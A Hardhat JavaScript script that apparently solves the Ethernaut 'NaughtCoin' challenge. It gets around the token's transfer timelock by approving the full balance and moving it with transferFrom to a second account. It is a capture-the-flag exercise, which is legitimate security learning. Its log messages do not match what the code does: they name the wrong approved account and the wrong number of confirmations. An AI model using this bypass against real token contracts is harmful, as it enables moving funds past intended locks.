const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account1, account2) {

    const NaughtCoin = await ethers.getContractFactory("NaughtCoin");

    let contract = NaughtCoin.attach(instance_address);

    // Balance of account 1
    let bal_1 = await contract.balanceOf(account1.address);

    console.log(`Account 1 Balance = ${bal_1}`);
    console.log(`Account 2 Balance = ${await contract.balanceOf(account2.address)}`);
    
    console.log(`Approve ${account2.address} to spend ${bal_1} tokens`);
    let tx = await contract.approve(account1.address, bal_1);
    console.log('Waiting for 10 confirmations...');
    await tx.wait(3);

    console.log(`Transfering ${bal_1} tokens from ${account1.address} to ${account2.address} using transferFrom`);
    tx = await contract.transferFrom(account1.address, account2.address, bal_1);
    console.log('Waiting for 10 confirmations...');
    await tx.wait(3);

    console.log(`Account 1 Balance = ${await contract.balanceOf(account1.address)}`);
    console.log(`Account 2 Balance = ${await contract.balanceOf(account2.address)}`);

    console.log('Success!');

}


async function main() {

    const [account1, account2] = await ethers.getSigners();
    console.log(`Account 1 address: ${account1.address}`);
    console.log(`Account 2 address: ${account2.address}`);
    console.log('');

    instance_address = '0x20B4a2dC888091974F4172D8062Ff4Ad17Fda224';

    await solve(instance_address, account1, account2);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
